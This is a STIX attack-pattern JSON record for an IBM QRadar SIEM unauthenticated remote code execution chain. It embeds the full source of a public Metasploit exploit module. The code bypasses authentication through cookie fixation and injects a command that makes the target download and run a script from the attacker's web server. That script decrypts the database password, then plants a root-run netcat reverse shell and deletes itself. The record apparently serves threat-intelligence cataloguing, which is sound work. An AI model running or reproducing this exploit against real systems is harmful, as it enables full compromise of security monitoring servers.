{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--64977421-81f1-443a-8774-5c3eac31fe03",
    "created": "2024-08-14T17:02:57.790989Z",
    "modified": "2024-08-14T17:02:57.790993Z",
    "name": "IBM QRadar SIEM Unauthenticated Remote Code Execution",
    "description": " IBM QRadar SIEM has three vulnerabilities in the Forensics web application that when chained together allow an attacker to achieve unauthenticated remote code execution.  The first stage bypasses authentication by fixating session cookies. The second stage uses those authenticated sessions cookies to write a file to disk and execute that file as the \"nobody\" user. The third and final stage occurs when the file executed as \"nobody\" writes an entry into the database that causes QRadar to execute a shell script controlled by the attacker as root within the next minute. Details about these vulnerabilities can be found in the advisories listed in References.  The Forensics web application is disabled in QRadar Community Edition, but the code still works so these vulnerabilities can be exploited in all flavours of QRadar. This module was tested with IBM QRadar CE 7.3.0 and 7.3.1. IBM has confirmed versions up to 7.2.8 patch 12 and 7.3.1 patch 3 are vulnerable. Due to payload constraints, this module only runs a generic/shell_reverse_tcp payload. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/ibm_qradar_unauth_rce.rb",
            "external_id": "ibm_qradar_unauth_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2016-9722"
        },
        {
            "source_name": "CVE",
            "external_id": "2018-1418"
        },
        {
            "source_name": "CVE",
            "external_id": "2018-1612"
        },
        {
            "source_name": "reference",
            "url": "https://blogs.securiteam.com/index.php/archives/3689"
        },
        {
            "source_name": "reference",
            "url": "https://raw.githubusercontent.com/pedrib/PoC/master/advisories/IBM/ibm-qradar-siem-forensics.txt"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/fulldisclosure/2018/May/54"
        },
        {
            "source_name": "reference",
            "url": "http://www-01.ibm.com/support/docview.wss?uid=swg22015797"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'securerandom'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::HttpServer\n  include Msf::Exploit::EXE\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'IBM QRadar SIEM Unauthenticated Remote Code Execution',\n      'Description'    => %q{\n        IBM QRadar SIEM has three vulnerabilities in the Forensics web application\n        that when chained together allow an attacker to achieve unauthenticated remote code execution.\n\n        The first stage bypasses authentication by fixating session cookies.\n        The second stage uses those authenticated sessions cookies to write a file to disk and execute\n        that file as the \"nobody\" user.\n        The third and final stage occurs when the file executed as \"nobody\" writes an entry into the\n        database that causes QRadar to execute a shell script controlled by the attacker as root within\n        the next minute.\n        Details about these vulnerabilities can be found in the advisories listed in References.\n\n        The Forensics web application is disabled in QRadar Community Edition, but the code still works,\n        so these vulnerabilities can be exploited in all flavours of QRadar.\n        This module was tested with IBM QRadar CE 7.3.0 and 7.3.1. IBM has confirmed versions up to 7.2.8\n        patch 12 and 7.3.1 patch 3 are vulnerable.\n        Due to payload constraints, this module only runs a generic/shell_reverse_tcp payload.\n      },\n      'Author'         =>\n        [\n          'Pedro Ribeiro <pedrib@gmail.com>'         # Vulnerability discovery and Metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'Platform'       => ['unix'],\n      'Arch'           => ARCH_CMD,\n      'References'     =>\n        [\n         ['CVE', '2016-9722'],\n         ['CVE', '2018-1418'],\n         ['CVE', '2018-1612'],\n         ['URL', 'https://blogs.securiteam.com/index.php/archives/3689'],\n         ['URL', 'https://raw.githubusercontent.com/pedrib/PoC/master/advisories/IBM/ibm-qradar-siem-forensics.txt'],\n         ['URL', 'https://seclists.org/fulldisclosure/2018/May/54'],\n         ['URL', 'http://www-01.ibm.com/support/docview.wss?uid=swg22015797']\n        ],\n      'Targets'        =>\n        [\n          [ 'IBM QRadar SIEM <= 7.3.1 Patch 2 / 7.2.8 Patch 11', {} ],\n        ],\n      'Payload'        => {\n        'Compat'       => {\n          'ConnectionType'  => 'reverse',\n        }\n      },\n      'DefaultOptions'  => {\n        'SSL'     => true,\n        # we can only run shell scripts, so set a reverse netcat payload by default\n        # the payload that will be run is in the first few lines of @payload\n        'PAYLOAD' => 'generic/shell_reverse_tcp',\n      },\n      'DisclosureDate'  => '2018-05-28',\n      'DefaultTarget'   => 0))\n    register_options(\n      [\n        Opt::RPORT(443),\n        OptString.new('SRVHOST', [true, 'HTTP server address', '0.0.0.0']),\n        OptString.new('SRVPORT', [true, 'HTTP server port', '4448']),\n      ])\n  end\n\n  def check\n    res = send_request_cgi({\n      'uri'    => '/ForensicsAnalysisServlet/',\n      'method' => 'GET'\n    })\n\n    if res.nil?\n      vprint_error 'Connection failed'\n      return CheckCode::Unknown\n    end\n\n    if res.code == 403\n      return CheckCode::Detected\n    end\n\n    CheckCode::Safe\n  rescue ::Rex::ConnectionError\n    vprint_error 'Connection failed'\n    return CheckCode::Unknown\n  end\n\n  # Handle incoming requests from QRadar\n  def on_request_uri(cli, request)\n    print_good(\"#{peer} - Sending privilege escalation payload to QRadar...\")\n    print_good(\"#{peer} - Sit back and relax, Shelly will come visit soon!\")\n    send_response(cli, @payload)\n  end\n\n\n  # step 1 of the exploit, bypass authentication in the ForensicAnalysisServlet\n  def set_cookies\n    @sec_cookie = SecureRandom.uuid\n    @csrf_cookie = SecureRandom.uuid\n\n    post_data = \"#{rand_text_alpha(5..12)},#{rand_text_alpha(5..12)},\" +\n      \"#{@sec_cookie},#{@csrf_cookie}\"\n\n    res = send_request_cgi({\n      'uri'       => '/ForensicsAnalysisServlet/',\n      'method'    => 'POST',\n      'ctype'     => 'application/json',\n      'cookie'    => \"SEC=#{@sec_cookie}; QRadarCSRF=#{@csrf_cookie};\",\n      'vars_get'  =>\n      {\n        'action'  => 'setSecurityTokens',\n        'forensicsManagedHostIps' => \"#{rand(256)}.#{rand(256)}.#{rand(256)}.#{rand(256)}\"\n      },\n      'data'      => post_data\n    })\n\n    if res.nil? or res.code != 200\n      fail_with(Failure::Unknown, \"#{peer} - Failed to set the SEC and QRadar CSRF cookies\")\n    end\n  end\n\n  def exploit\n    print_status(\"#{peer} - Attempting to exploit #{target.name}\")\n\n    # run step 1\n    set_cookies\n\n    # let's prepare step 2 (payload) and 3 (payload exec as root)\n    @payload_name = rand_text_alpha_lower(3..5)\n    root_payload = rand_text_alpha_lower(3..5)\n\n    if (datastore['SRVHOST'] == \"0.0.0.0\" or datastore['SRVHOST'] == \"::\")\n      srv_host = Rex::Socket.source_address(rhost)\n    else\n      srv_host = datastore['SRVHOST']\n    end\n\n    http_service = (datastore['SSL'] ? 'https://' : 'http://') + srv_host + ':' + datastore['SRVPORT'].to_s\n    service_uri = http_service + '/' + @payload_name\n\n    print_status(\"#{peer} - Starting up our web service on #{http_service} ...\")\n    start_service({'Uri' => {\n      'Proc' => Proc.new { |cli, req|\n        on_request_uri(cli, req)\n      },\n      'Path' => \"/#{@payload_name}\"\n    }})\n\n    @payload = %{#!/bin/bash\n\n# our payload that's going to be downloaded from our web server\ncat <<EOF > /store/configservices/staging/updates/#{root_payload}\n#!/bin/bash\n/usr/bin/nc -e /bin/sh #{datastore['LHOST']} #{datastore['LPORT']} &\nEOF\n\n### below is adapted from /opt/qradar/support/changePasswd.sh\n[ -z $NVA_CONF ] && NVA_CONF=\"/opt/qradar/conf/nva.conf\"\nNVACONF=`grep \"^NVACONF=\" $NVA_CONF 2> /dev/null | cut -d= -f2`\nFRAMEWORKS_PROPERTIES_FILE=\"frameworks.properties\"\nFORENSICS_USER_FILE=\"config_user.xml\"\nFORENSICS_USER_FILE_CONFIG=\"$NVACONF/$FORENSICS_USER_FILE\"\n\n# get the encrypted db password from the config\nPASSWORDENCRYPTED=`cat $FORENSICS_USER_FILE_CONFIG | grep WEBUSER_DB_PASSWORD | grep -o -P '(?<=>)([\\\\w\\\\=\\\\+\\\\/]*)(?=<)'`\n\nQVERSION=$(/opt/qradar/bin/myver | awk -F. '{print $1$2$3}')\n\nAU_CRYPT=/opt/qradar/lib/Q1/auCrypto.pm\nP_ENC=$(grep I_P_ENC ${AU_CRYPT} | cut -d= -f2-)\nP_DEC=$(grep I_P_DEC ${AU_CRYPT} | cut -d= -f2-)\n\nAESKEY=`grep 'aes.key=' $NVACONF/$FRAMEWORKS_PROPERTIES_FILE | cut -c9-`\n\n#if 7.2.8 or greater, use new method for hashing and salting passwords\nif [[ $QVERSION -gt 727 || -z \"$AESKEY\" ]]\nthen\n    PASSWORD=$(perl <(echo ${P_DEC} | base64 -d) <(echo ${PASSWORDENCRYPTED}))\n      [ $? != 0 ] && echo \"ERROR: Unable to decrypt $PASSWORDENCRYPTED\" && exit 255\nelse\n\n    PASSWORD=`/opt/qradar/bin/runjava.sh -Daes.key=$AESKEY com.q1labs.frameworks.crypto.AESUtil decrypt $PASSWORDENCRYPTED`\n    [ $? != 0 ] && echo \"ERROR: Unable to decrypt $PASSWORDENCRYPTED\" && exit 255\nfi\n\nPGPASSWORD=$PASSWORD /usr/bin/psql -h localhost -U qradar qradar -c \\\n\"insert into autoupdate_patch values ('#{root_payload}',#{rand(1000)+100},'minor',false,#{rand(9999)+100},0,'',1,false,'','','',false)\"\n\n# kill ourselves!\n(sleep 2 && rm -- \"$0\") &\n}\n\n    # let's do step 2 then, ask QRadar to download and execute our payload\n    print_status(\"#{peer} - Asking QRadar to download and execute #{service_uri}\")\n\n    exec_cmd = \"$(mkdir -p /store/configservices/staging/updates && wget --no-check-certificate -O \" +\n      \"/store/configservices/staging/updates/#{@payload_name} #{service_uri} && \" +\n      \"/bin/bash /store/configservices/staging/updates/#{@payload_name})\"\n\n    payload_step2 = \"pcap[0][pcap]\" +\n      \"=/#{rand_text_alpha_lower(2..6) + '/' + rand_text_alpha_lower(2..6)}\" +\n      \"&pcap[1][pcap]=#{Rex::Text::uri_encode(exec_cmd, 'hex-all')}\"\n\n    uri_step2 = \"/ForensicsAnalysisServlet/?forensicsManagedHostIps\" +\n      \"=127.0.0.1/forensics/file.php%3f%26&action=get&slavefile=true\"\n\n    res = send_request_cgi({\n        'uri'       => uri_step2 + '&' + payload_step2,\n        'method'    => 'GET',\n        'cookie'    => \"SEC=#{@sec_cookie}; QRadarCSRF=#{@csrf_cookie};\",\n      })\n\n  # now we just sit back and wait for step 2 payload to be downloaded and executed\n  # ... and then step 3 to complete. Let's give it a little more than a minute.\n  Rex.sleep 80\n  end\nend\n",
    "x_mitre_disclosure_date": "2018-05-28",
    "x_mitre_platforms": [
        "['unix']"
    ]
}